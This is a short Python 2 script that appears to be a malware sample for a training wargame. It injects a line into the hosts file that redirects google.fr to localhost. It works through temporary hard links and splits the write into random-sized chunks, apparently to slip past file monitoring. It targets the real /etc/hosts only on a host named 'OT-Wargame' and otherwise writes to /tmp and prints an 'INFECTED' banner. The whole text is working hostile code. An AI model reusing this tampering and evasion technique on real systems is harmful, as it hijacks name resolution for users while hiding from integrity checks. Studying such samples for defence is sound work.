import socket
import os
from random import randint
from uuid import uuid4 as uuid


if __file__ != "lolita.final.pyc":
    if socket.gethostname() == "OT-Wargame":
        hosts_path = "/etc/hosts"
    else:
        hosts_path = "/tmp/hosts"    
        print " ###########  /!\ INFECTED /!\ ############### "
    
    new_host = "127.0.0.1\tgoogle.fr\n"
    
    hardlink = "/tmp/%s" % uuid()
    os.link(hosts_path, hardlink)
    f = open(hardlink, "r")
    content=f.read()
    f.close()
    os.unlink(hardlink)
    
    if content.find(new_host) == -1:
        size = len(new_host)
        offset = 0
        while(offset < size):
            hardlink = "/tmp/%s" % uuid()
            os.link(hosts_path, hardlink)
            f = open(hardlink, "a")
            size_chunk = randint(1, 1+(size-offset)/2)
            f.write(new_host[offset:offset+size_chunk])
            f.flush()
            offset += size_chunk
            f.close()
            os.unlink(hardlink)
